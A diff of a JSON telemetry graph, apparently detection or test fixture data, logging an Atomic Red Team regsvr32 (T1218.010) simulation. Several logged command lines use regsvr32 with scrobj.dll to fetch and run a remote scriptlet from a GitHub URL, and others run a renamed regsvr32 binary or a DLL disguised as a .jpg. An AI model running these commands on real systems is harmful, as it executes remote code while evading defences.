+        "guid": "{FF16AF91-36E1-6013-7903-00000000A401}",
+        "pid": "2324",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1400 for regsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "82ad55ba1f7e67e9bb4ef01fcc1294dbfeccef94b0b1c0b856787717e65b1e95",
+        "parent_process_id": "Process:{FF16AF91-26B7-6013-1500-00000000A401}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe"
+      }
+    },
+    {
+      "id": "File:06e06ba86a97de3397e34ad14f1cb900b578b84c114fbfed4ee76446879a18aa:11",
+      "label": "regsvr32.txt",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "c:\\temp\\regsvr32.txt",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "event_id": "11",
+        "id": "File:06e06ba86a97de3397e34ad14f1cb900b578b84c114fbfed4ee76446879a18aa:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "regsvr32.txt",
+        "name": "regsvr32.txt"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-b803-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-3708-6013-b803-000000001100}",
+        "pid": "6412",
+        "image_path": "%syswow64%\\regsvr32.exe",
+        "command_line": "%syswow64%\\regsvr32.exe  \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=EB3B90B6989227F590BB36356DF96A30,SHA256=F80B4224C670E76E05A70CC5403818B11C7A4CA10542A1F9B5D935E4FCA08579,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8",
+        "command_hash": "8771c8a124490a0e1c7c771c80493fda8c66c724714ca48c7e113f374ed575f7",
+        "parent_process_id": "Process:{8e433fbf-3708-6013-b703-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3708-6013-b803-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Registry:83fe67497fb55ad84a8aab97a7957d7ee1b80a1d475c3e79e597b6fc0b5920a3:13",
+      "label": "regsvr32.exe",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\BAM\\STATE\\USERSETTINGS\\S-1-5-21-1117338214-1411020952-3261875682-500\\\\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32",
+        "value_name": "regsvr32.exe",
+        "value_data": "Binary Data",
+        "source_image_path": "%system32%\\regsvr32.exe",
+        "parent_process_id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
+        "event_id": "13",
+        "id": "Registry:83fe67497fb55ad84a8aab97a7957d7ee1b80a1d475c3e79e597b6fc0b5920a3:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:1",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{FF16AF91-36E1-6013-7503-00000000A401}",
+        "pid": "5260",
+        "image_path": "%syswow64%\\regsvr32.exe",
+        "command_line": "%syswow64%\\regsvr32.exe  \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=56CF190F4143DC68800C4125D6001B07,SHA256=F72ED4D11C9971A9B7CE0A5681EE35968A6B4CCDC2F2B3A9F3E81418605FA467,IMPHASH=D053774A49BA83FF54C68888CB687C6C",
+        "command_hash": "8771c8a124490a0e1c7c771c80493fda8c66c724714ca48c7e113f374ed575f7",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe",
+        "parent_process_id": "Process:{FF16AF91-36E1-6013-7403-00000000A401}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-3708-6013-bb03-000000001100}",
+        "pid": "5928",
+        "image_path": "c:\\temp\\notregsvr32.exe",
+        "command_line": "c:\\temp\\notregsvr32.exe  \\s %temp%\\shell32.jpg",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+        "command_hash": "e6996c4942efbf83f395cff13de299a5ee7a42106dd0d6e5490c54f5068a3d6f",
+        "parent_process_id": "Process:{8e433fbf-3708-6013-ba03-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-2a44-6013-1100-000000001100}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8e433fbf-2a44-6013-1100-000000001100}",
+        "pid": "1116",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8e433fbf-2a44-6013-1100-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36F2-6013-7C03-00000000A401}:1",
+      "label": "windows command processor",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{FF16AF91-36F2-6013-7C03-00000000A401}",
+        "pid": "2292",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "d6c50ff6139393f02316cd441c557020cab45f2824262c86456802f79fb473f4",
+        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36F2-6013-7C03-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-36df-6013-9f03-000000001100}",
+        "pid": "10200",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "%system32%\\regsvr32.exe  \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+        "command_hash": "9d8238768dfb1b0126c45718b401de619556ee256c55abeda4b861e5cb82346a",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe",
+        "parent_process_id": "Process:{8e433fbf-36df-6013-9e03-000000001100}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-26B7-6013-1500-00000000A401}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{FF16AF91-26B7-6013-1500-00000000A401}",
+        "pid": "1492",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{FF16AF91-26B7-6013-1500-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-6E03-00000000A401}:1",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{FF16AF91-36E1-6013-6E03-00000000A401}",
+        "pid": "1984",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "%system32%\\regsvr32.exe  \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=8CF9086BE38A15E905924B4A45D814D9,SHA256=00A1CF85C6AB96DF38A4023F0CEE4DF60F62280768FC9C06A235E6D2D644169D,IMPHASH=1C8D7F52BBDAEF92EB0104CB6362D5D0",
+        "command_hash": "edd28ac29a58a48a9706cd7bd8f0b2685e5f819a09aa9dc529d96be107ac5ed6",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36E1-6013-6E03-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe",
+        "parent_process_id": "Process:{FF16AF91-36E1-6013-6D03-00000000A401}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36e1-6013-a603-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-36e1-6013-a603-000000001100}",
+        "pid": "6696",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "%system32%\\regsvr32.exe  \\s %temp%\\shell32.jpg",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+        "command_hash": "2d02a58c4932a6cdb04ba1f79241e33a6860802a596b4595c9ab48fdf12e4ed3",
+        "parent_process_id": "Process:{8e433fbf-36e1-6013-a503-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36e1-6013-a603-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:10",
+      "label": "notregsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "notregsvr32.exe",
+        "guid": "{8e433fbf-3708-6013-b503-000000001100}",
+        "pid": "10452",
+        "image_path": "c:\\temp\\notregsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1000 for notregsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "51b2beceb2ca51d931aef04db6848e3147a31f5c50ad764db40dd5fd340126fd",
+        "parent_process_id": "Process:{8e433fbf-2a47-6013-6b00-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notregsvr32.exe",
+        "name": "notregsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-36df-6013-9c03-000000001100}",
+        "pid": "10076",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "%system32%\\regsvr32.exe  \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+        "command_hash": "edd28ac29a58a48a9706cd7bd8f0b2685e5f819a09aa9dc529d96be107ac5ed6",
+        "parent_process_id": "Process:{8e433fbf-36df-6013-9b03-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:10",
+      "label": "notregsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "notregsvr32.exe",
+        "guid": "{8e433fbf-3707-6013-b203-000000001100}",
+        "pid": "8580",
+        "image_path": "c:\\temp\\notregsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1478 for notregsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "7e9918384984f122b4b5cfc87096969410b4318483d5034b226304730a5e889d",
+        "parent_process_id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notregsvr32.exe",
+        "name": "notregsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3707-6013-b103-000000001100}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8e433fbf-3707-6013-b103-000000001100}",
+        "pid": "4716",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"c:\\temp\\notregsvr32.exe \\s \\u \\i:c:\\temp\\regsvr32.txt scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+        "command_hash": "d23634689d65326167d0cab15e46e2aee8a03c4b7e50df6c6424e3d0fc406904",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3707-6013-b103-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8e433fbf-3433-6013-2203-000000001100}",
+        "pid": "6680",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-2a47-6013-6b00-000000001100}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8e433fbf-2a47-6013-6b00-000000001100}",
+        "pid": "5532",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8e433fbf-2a47-6013-6b00-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-3708-6013-b503-000000001100}",
+        "pid": "10452",
+        "image_path": "c:\\temp\\notregsvr32.exe",
+        "command_line": "c:\\temp\\notregsvr32.exe  \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+        "command_hash": "25c9c3d15f3df7bcf374f9d24801bd7abbd1d3e4684dad15491a7c0624bfa870",
+        "parent_process_id": "Process:{8e433fbf-3708-6013-b403-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-ba03-000000001100}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8e433fbf-3708-6013-ba03-000000001100}",
+        "pid": "7360",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"c:\\temp\\notregsvr32.exe \\s %temp%\\shell32.jpg",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+        "command_hash": "1fb84c6eb812cf3134cd8fdcdca39c49c3419f964016036320e1cc5d58528237",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3708-6013-ba03-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-7403-00000000A401}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{FF16AF91-36E1-6013-7403-00000000A401}",
+        "pid": "2192",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"if \"%processor_architecture%\"==\"amd64\" (%syswow64%\\regsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll) else ( %windir%\\system32\\regsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll )",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "18afeecdce2e9c7032df23a17d77b76d8ea94f1ef60547fb7a8bc4246b621e75",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36E1-6013-7403-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:10",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "regsvr32.exe",
+        "guid": "{8e433fbf-36df-6013-a303-000000001100}",
+        "pid": "5408",
+        "image_path": "%syswow64%\\regsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x100000 for regsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "acfc804965fbb3f02174cfa23f08391c929fbc392cf365924e6a6f52e516373b",
+        "parent_process_id": "Process:{8e433fbf-2a44-6013-1100-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-b703-000000001100}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8e433fbf-3708-6013-b703-000000001100}",
+        "pid": "6088",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"if \"%processor_architecture%\"==\"amd64\" (%syswow64%\\regsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll) else ( c:\\temp\\notregsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll )",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+        "command_hash": "f10871028002fefd1448666201cc7ee82e36ecf56c8dec48c876cbcd5ca2248a",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3708-6013-b703-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:10",
+      "label": "notregsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "notregsvr32.exe",
+        "guid": "{8e433fbf-3708-6013-bb03-000000001100}",
+        "pid": "5928",
+        "image_path": "c:\\temp\\notregsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1400 for notregsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "453eff8ec11c1599adf65c247b423034b0d6f86a2f876f47f64d9b1c6cb65735",
+        "parent_process_id": "Process:{8e433fbf-2a45-6013-2700-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notregsvr32.exe",
+        "name": "notregsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-a103-000000001100}:1",
+      "label": "windows calculator",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows calculator",
+        "guid": "{8e433fbf-36df-6013-a103-000000001100}",
+        "pid": "10728",
+        "image_path": "%system32%\\calc.exe",
+        "command_line": "%system32%\\calc.exe",
+        "original_file_name": "calc.exe",
+        "image_hash": "MD5=F88CC05134C555D4E1CD1DEF78162A9A,SHA256=A103A57D50B32469C5811E2808F021ADF9D9220093B540B8A9C83B5C821D370E,IMPHASH=8EEAA9499666119D13B3F44ECD77A729",
+        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
+        "parent_process_id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36df-6013-a103-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows calculator",
+        "name": "windows calculator"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36e1-6013-a503-000000001100}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8e433fbf-36e1-6013-a503-000000001100}",
+        "pid": "5088",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s %temp%\\shell32.jpg",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+        "command_hash": "b509f7351119f9dbbb78d564309f55f8b82bf56f1243f4aba2abedc6ddf153f5",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36e1-6013-a503-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "user_id": "User:S-1-5-18"
+      }
     }
   ],
   "edges": [
@@ -1278,7 +1278,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.853129+00:00"
+        "timestamp": "2026-05-08T17:48:57.538997+00:00"
       }
     },
     {
@@ -1292,7 +1292,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T16:35:30.853129+00:00"
+        "timestamp": "2026-05-08T17:48:57.541104+00:00"
       }
     },
     {
@@ -1306,7 +1306,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.853129+00:00"
+        "timestamp": "2026-05-08T17:48:57.542109+00:00"
       }
     },
     {
@@ -1320,7 +1320,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:30.853129+00:00"
+        "timestamp": "2026-05-08T17:48:57.543092+00:00"
       }
     },
     {
@@ -1334,7 +1334,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.901166+00:00"
+        "timestamp": "2026-05-08T17:48:57.622383+00:00"
       }
     },
     {
@@ -1348,7 +1348,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.917228+00:00"
+        "timestamp": "2026-05-08T17:48:57.623353+00:00"
       }
     },
     {
@@ -1362,7 +1362,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:30.919238+00:00"
+        "timestamp": "2026-05-08T17:48:57.623353+00:00"
       }
     },
     {
@@ -1376,7 +1376,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.921245+00:00"
+        "timestamp": "2026-05-08T17:48:57.623353+00:00"
       }
     },
     {
@@ -1390,7 +1390,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.921245+00:00"
+        "timestamp": "2026-05-08T17:48:57.623353+00:00"
       }
     },
     {
@@ -1404,7 +1404,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T16:35:30.921245+00:00"
+        "timestamp": "2026-05-08T17:48:57.638999+00:00"
       }
     },
     {
@@ -1418,7 +1418,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T16:35:30.980478+00:00"
